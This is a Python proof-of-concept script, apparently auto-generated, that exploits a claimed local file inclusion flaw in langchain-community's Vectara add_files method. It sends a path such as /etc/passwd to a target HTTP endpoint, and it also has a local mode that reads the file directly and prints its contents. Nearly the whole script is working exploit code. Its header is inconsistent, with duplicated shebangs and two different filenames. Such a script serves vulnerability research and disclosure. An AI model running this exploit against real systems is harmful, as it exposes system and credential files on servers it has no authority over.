#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-007
# Sink: add_files
# Auto-generated — run with: python3 lfi_supply_like_add_files_6.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) in langchain-community Vectara.from_files

Vulnerability: The add_files() method directly uses user-supplied file paths in open()
without any path validation or sanitization. An attacker can supply a path like
'../../etc/passwd' to read arbitrary files from the server's filesystem.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign local file)
and sending it to a controlled endpoint (or printing the content if no endpoint is available).

Usage:
    python3 poc_vectara_lfi.py [--target http://localhost:8080] [--file /etc/passwd]

Requirements: Python 3.6+, requests (or stdlib urllib)
"""

import argparse
import json
import os
import sys
import tempfile
import urllib.request
import urllib.error
import urllib.parse

# ---------------------------------------------------------------------------
# Configuration – change these to match your test environment
# ---------------------------------------------------------------------------
DEFAULT_TARGET = "http://localhost:8080/api/v1/trigger"  # simulated endpoint
DEFAULT_FILE = "/etc/passwd"  # benign file to read (safe for demonstration)
# ---------------------------------------------------------------------------


def simulate_vectara_add_files(files_list, metadatas=None):
    """
    Simulates the vulnerable add_files() method from langchain_community.vectorstores.Vectara.
    This is the exact logic from the library – no path sanitization.
    """
    doc_ids = []
    for inx, file in enumerate(files_list):
        if not os.path.exists(file):
            print(f"[!] File {file} does not exist, skipping")
            continue
        md = metadatas[inx] if metadatas else {}
        # The vulnerable open() call – no path validation
        try:
            with open(file, "rb") as f:
                file_content = f.read()
            print(f"[+] Successfully read file: {file} ({len(file_content)} bytes)")
            # In the real library, this would be uploaded to Vectara's API.
            # Here we just print the content (first 500 bytes for safety).
            print(f"[*] Content preview:\n{file_content[:500].decode('utf-8', errors='replace')}")
            doc_ids.append(f"simulated_doc_{inx}")
        except Exception as e:
            print(f"[!] Error reading file {file}: {e}")
    return doc_ids


def exploit_via_http(target_url, file_path):
    """
    Sends a POST request to the simulated endpoint with the malicious file path.
    The endpoint is expected to call Vectara.from_files() with attacker-controlled input.
    """
    print(f"[*] Sending exploit to {target_url}")
    print(f"[*] Attempting to read: {file_path}")

    # Prepare the payload – the endpoint expects a string (file path)
    payload = {"files": file_path}

    try:
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            target_url,
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            result = response.read().decode("utf-8")
            print(f"[+] Server response: {result}")
            return result
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        if e.code == 500:
            print("[*] Server likely crashed or returned error – this may indicate successful exploitation")
        return None
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
        print("[*] Make sure the target server is running and reachable")
        return None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return None


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in langchain-community Vectara.from_files"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--file",
        default=DEFAULT_FILE,
        help=f"File to read (default: {DEFAULT_FILE})",
    )
    parser.add_argument(
        "--local",
        action="store_true",
        help="Run locally (simulate the vulnerable function without HTTP)",
    )
    args = parser.parse_args()

    print("=" * 60)
    print("PoC: Local File Inclusion in langchain-community Vectara")
    print("=" * 60)

    if args.local:
        # Run the vulnerable function directly (safe, no network)
        print("[*] Running local simulation (no HTTP)")
        print(f"[*] Attempting to read: {args.file}")
        simulate_vectara_add_files([args.file])
    else:
        # Exploit via HTTP to the simulated endpoint
        exploit_via_http(args.target, args.file)

    print("\n[*] PoC completed. If you see file contents above, the vulnerability is confirmed.")


if __name__ == "__main__":
    main()
